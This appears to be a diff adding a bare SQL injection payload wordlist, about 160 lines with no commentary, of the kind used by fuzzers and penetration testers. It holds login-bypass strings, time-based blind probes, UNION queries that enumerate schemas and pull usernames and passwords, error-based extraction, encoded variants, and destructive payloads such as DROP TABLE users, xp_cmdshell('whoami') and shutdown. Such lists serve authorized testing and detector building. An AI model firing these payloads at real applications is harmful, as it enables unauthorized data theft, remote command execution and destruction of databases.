@@ -1,0 +1,162 @@
+'
+''
+
+"
+
+`
+
+
+' OR '1'='1
+" OR "1"="1
+' OR 1=1 --
+" OR 1=1 --
+
+' OR 'a'='a
+" OR "a"="a
+
+admin' --
+admin" --
+
+'--
+"--
+
+
+' #
+" #
+
+'/*
+"/*
+
+') OR ('1'='1
+") OR ("1"="1
+
+' OR 'x'='x
+" OR "x"="x
+
+' OR 1=1#
+" OR 1=1#
+
+' OR '1'='1' --
+" OR "1"="1" --
+
+' OR sleep(5) --
+" OR sleep(5) --
+
+' WAITFOR DELAY '0:0:5' --
+"; WAITFOR DELAY '0:0:5' --
+
+' OR pg_sleep(5) --
+" OR pg_sleep(5) --
+
+1' ORDER BY 1 --
+1' ORDER BY 2 --
+1' ORDER BY 3 --
+1' ORDER BY 4 --
+
+1 UNION SELECT NULL --
+1 UNION SELECT NULL,NULL --
+1 UNION SELECT NULL,NULL,NULL --
+
+1' UNION SELECT NULL --
+1' UNION SELECT NULL,NULL --
+1' UNION SELECT NULL,NULL,NULL --
+
+1 UNION SELECT version() --
+1 UNION SELECT @@version --
+
+1 UNION SELECT database() --
+1 UNION SELECT user() --
+
+' UNION SELECT NULL,NULL,NULL --
+" UNION SELECT NULL,NULL,NULL --
+
+' UNION SELECT username,password FROM users --
+" UNION SELECT username,password FROM users --
+
+1 AND 1=1
+1 AND 1=2
+
+' AND 1=1 --
+' AND 1=2 --
+
+" AND 1=1 --
+" AND 1=2 --
+
+1 OR 1=1
+1 OR 1=2
+
+' OR EXISTS(SELECT * FROM users) --
+" OR EXISTS(SELECT * FROM users) --
+
+1; DROP TABLE users --
+'; DROP TABLE users --
+
+1'; EXEC xp_cmdshell('whoami') --
+"; EXEC xp_cmdshell('whoami') --
+
+1 AND SLEEP(5)
+1 AND pg_sleep(5)
+
+1 AND benchmark(1000000,MD5(1))
+
+' UNION ALL SELECT NULL,NULL,NULL --
+" UNION ALL SELECT NULL,NULL,NULL --
+
+1' AND substring(@@version,1,1)='5' --
+1' AND substring(@@version,1,1)='8' --
+
+1' AND ascii(substring((SELECT database()),1,1)) > 100 --
+
+' OR updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) --
+' OR extractvalue(1,concat(0x7e,(SELECT database()),0x7e)) --
+
+1' HAVING 1=1 --
+1' GROUP BY columnnames having 1=1 --
+
+') UNION SELECT NULL,NULL,NULL --
+")) UNION SELECT NULL,NULL,NULL --
+
+%27
+%22
+
+%27%20OR%201=1--
+%22%20OR%201=1--
+
+%2527%2520OR%25201%253D1--
+
+'or'1'='1
+admin' or '1'='1
+admin" or "1"="1
+
+') OR 1=1#
+") OR 1=1#
+
+1)) OR ((1=1
+
+' OR true --
+" OR true --
+
+' OR false --
+" OR false --
+
+1' UNION SELECT table_name,NULL FROM information_schema.tables --
+
+1' UNION SELECT column_name,NULL FROM information_schema.columns --
+
+' and (select substring(@@version,1,1))='5
+
+' and ascii(substring((select user()),1,1))>100 --
+
+1 AND (SELECT 1 FROM users LIMIT 1)=1
+
+1' AND IF(1=1,SLEEP(5),0) --
+
+' XOR(if(now()=sysdate(),sleep(5),0)) XOR '
+
+1' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END)) --
+
+1' AND updatexml(null,concat(0x0a,(version())),null) --
+
+1' AND extractvalue(null,concat(0x0a,(database()))) --
+
+1'; shutdown --
